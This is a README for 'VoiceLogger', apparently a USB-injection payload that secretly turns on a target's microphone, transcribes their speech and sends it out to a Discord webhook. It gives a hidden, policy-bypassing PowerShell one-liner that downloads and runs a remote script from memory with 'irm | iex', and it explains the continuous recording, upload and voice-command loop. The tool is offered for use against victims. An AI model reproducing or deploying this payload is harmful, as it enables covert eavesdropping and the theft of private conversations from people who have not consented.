

# VoiceLogger

## Description

This payload activates your target's microphone, converts their speech to text, and exfils it to Discord 
with the optional functionality of incorporating voice activated payloads.

## Getting Started

### Dependencies

* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory

`$db` is the variable that stores your Discord webhook 

```
powershell -w h -NoP -Ep Bypass $dc='';irm  | iex
```

### The Function

- The voiceLogger function leverages the System.Speech namespace to create a continuous speech-to-text logger. 
- It initializes a speech recognition engine, loads a dictation grammar, and sets the input to the default audio device. 
- The script then enters an infinite loop where it listens for speech input and recognizes the text. 
- The recognized text is written to the output and saved to a temporary log file. 
- The log file content is then uploaded using the DC-Upload function. 
- Additionally, the script checks for specific voice commands using a switch statement with regex patterns: if the word "notepad" is detected, it launches Notepad, 
- and if the word "exit" is detected, it breaks the loop and stops the voice logger. 
- Once the loop is terminated, the log file's content is cleared.


